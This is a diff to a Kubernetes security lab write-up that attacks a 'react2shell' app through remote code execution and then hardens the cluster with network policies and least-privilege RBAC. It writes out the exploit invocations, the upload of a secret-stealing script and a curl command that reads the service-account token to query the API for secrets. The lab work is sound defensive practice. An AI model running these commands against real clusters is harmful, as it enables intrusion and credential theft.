@@ -85,6 +85,8 @@ kubectl port-forward service/react2shell -n react 3000:3000
 ```sh
 VICTIM_URL="http://react2shell.arguswatcher.net:3000"
 
+kubectl rollout restart deploy/react2shell -n react
+
 # ##############################
 # Attack
 # ##############################
@@ -93,8 +95,9 @@ python scripts/rce.py $VICTIM_URL "id"
 # uid=0(root) gid=0(root) groups=0(root)
 
 # 2. look for an AWS identity — none projected (annotation removed, role gone)
-python3 scripts/rce.py $VICTIM_URL "env | grep AWS"
-# (no output) — no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE
+python scripts/rce.py $VICTIM_URL "env | grep AWS"
+# no output
+# no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE
 
 # 3. upload js
 b64=$(base64 -w0 scripts/steal_secret.js)
@@ -102,8 +105,16 @@ python3 scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"
 
 # 4. try to grab the jewel — no credentials to assume any role
 python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
-# fails: no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
+# no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
 ```
+
+- no AWS environment variables
+
+![cloud01](./img/harden/cloud01.png)
+
+- Cannot list cloud secret
+
+![cloud02](./img/harden/cloud02.png)
 
 ---
 
@@ -111,10 +122,10 @@ python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
 
 ### Root cause analysis
 
-| Issue | Root cause | fix |
-| ----- | ---------- | --- |
-|       | IAM        |     |
-|       | IRSA       |     |
+| Issue                    | Root cause                          | fix                    |
+| ------------------------ | ----------------------------------- | ---------------------- |
+| Access to internal-api   | flat network without network policy | Add network policy     |
+| Access to cluster secret | board RBAC permission               | grant least permission |
 
 ---
 
@@ -140,7 +151,36 @@ kubectl port-forward service/react2shell -n react 3000:3000
 ### Confirm
 
 ```sh
+# ##############################
+# RBAC: sa permission
+# ##############################
+# list permissions as sa
+kubectl auth can-i --list --as=system:serviceaccount:react:react2shell -n react
 
+# can list secret
+kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:secure-frontend:react2shell
+
+# confirm
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets'
+
+# secure: cannot query ns
+python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces'
+```
+
+```sh
+# ##############################
+# Network policy: internal-api
+# ##############################
+# confirm netpol
+kubectl get netpol -n internal
+# NAME                        POD-SELECTOR    AGE
+# allow-dns-egress            <none>          81s
+# allow-nginx-api-from-prod   app=nginx-api   81s
+# default-deny-all            <none>          81s
+
+# confirm
+python scripts/rce.py $VICTIM_URL "curl -sS -m 5 http://backend-api.secure-backend/api/v1/users"
+# curl: (28) Connection timed out after 5001 milliseconds
 ```
 
 ---
